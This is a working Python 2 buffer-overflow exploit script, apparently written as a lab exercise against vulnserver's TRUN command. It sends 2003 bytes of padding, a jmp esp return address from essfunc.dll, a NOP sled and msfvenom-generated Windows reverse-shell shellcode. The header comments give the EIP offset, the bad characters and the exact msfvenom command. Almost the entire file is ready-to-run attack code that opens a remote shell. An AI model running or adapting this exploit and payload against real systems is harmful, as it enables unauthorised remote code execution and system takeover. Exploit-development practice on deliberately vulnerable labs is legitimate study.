#!/usr/bin/python

import socket
import sys


host = "172.16.66.128"
port = 9999

###########################################
## WriTTen by: van6uard
## EIP is overwritten after 2003 bytes.
## Bad Characters '\x00'
## Return Address is Log data, item 9 Address=625011C7
## Message=  0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\van6uard\Desktop\vulnserver\essfunc.dll)
## Tested on Windows 7 Ultimate x86, but uses an application DLL, so should work on all windows versions.
## msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\x00' -f c EXITFUNC=thread # plays nicely and doesn't kill the app!
###########################################

shellcode = (
"\xda\xc5\xbb\xc4\xce\xbf\xd8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x13\x03\x9e\xdd\x5d\x2d\xe2\x0a\x23"
"\xce\x1a\xcb\x44\x46\xff\xfa\x44\x3c\x74\xac\x74\x36\xd8\x41"
"\xfe\x1a\xc8\xd2\x72\xb3\xff\x53\x38\xe5\xce\x64\x11\xd5\x51"
"\xe7\x68\x0a\xb1\xd6\xa2\x5f\xb0\x1f\xde\x92\xe0\xc8\x94\x01"
"\x14\x7c\xe0\x99\x9f\xce\xe4\x99\x7c\x86\x07\x8b\xd3\x9c\x51"
"\x0b\xd2\x71\xea\x02\xcc\x96\xd7\xdd\x67\x6c\xa3\xdf\xa1\xbc"
"\x4c\x73\x8c\x70\xbf\x8d\xc9\xb7\x20\xf8\x23\xc4\xdd\xfb\xf0"
"\xb6\x39\x89\xe2\x11\xc9\x29\xce\xa0\x1e\xaf\x85\xaf\xeb\xbb"
"\xc1\xb3\xea\x68\x7a\xcf\x67\x8f\xac\x59\x33\xb4\x68\x01\xe7"
"\xd5\x29\xef\x46\xe9\x29\x50\x36\x4f\x22\x7d\x23\xe2\x69\xea"
"\x80\xcf\x91\xea\x8e\x58\xe2\xd8\x11\xf3\x6c\x51\xd9\xdd\x6b"
"\x96\xf0\x9a\xe3\x69\xfb\xda\x2a\xae\xaf\x8a\x44\x07\xd0\x40"
"\x94\xa8\x05\xc6\xc4\x06\xf6\xa7\xb4\xe6\xa6\x4f\xde\xe8\x99"
"\x70\xe1\x22\xb2\x1b\x18\xa5\xc2\xdb\x22\x34\x55\xde\x22\x27"
"\xf9\x57\xc4\x2d\x11\x3e\x5f\xda\x88\x1b\x2b\x7b\x54\xb6\x56"
"\xbb\xde\x35\xa7\x72\x17\x33\xbb\xe3\xd7\x0e\xe1\xa2\xe8\xa4"
"\x8d\x29\x7a\x23\x4d\x27\x67\xfc\x1a\x60\x59\xf5\xce\x9c\xc0"
"\xaf\xec\x5c\x94\x88\xb4\xba\x65\x16\x35\x4e\xd1\x3c\x25\x96"
"\xda\x78\x11\x46\x8d\xd6\xcf\x20\x67\x99\xb9\xfa\xd4\x73\x2d"
"\x7a\x17\x44\x2b\x83\x72\x32\xd3\x32\x2b\x03\xec\xfb\xbb\x83"
"\x95\xe1\x5b\x6b\x4c\xa2\x7c\x8e\x44\xdf\x14\x17\x0d\x62\x79"
"\xa8\xf8\xa1\x84\x2b\x08\x5a\x73\x33\x79\x5f\x3f\xf3\x92\x2d"
"\x50\x96\x94\x82\x51\xb3"
        )

buf = 'TRUN /.:/' + 'A'*2003 + '\xc7\x11\x50\x62' + '\x90'*12 + shellcode + 'D'*(5000-2003-4-12-len(shellcode)) + '\x00\x00'

try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
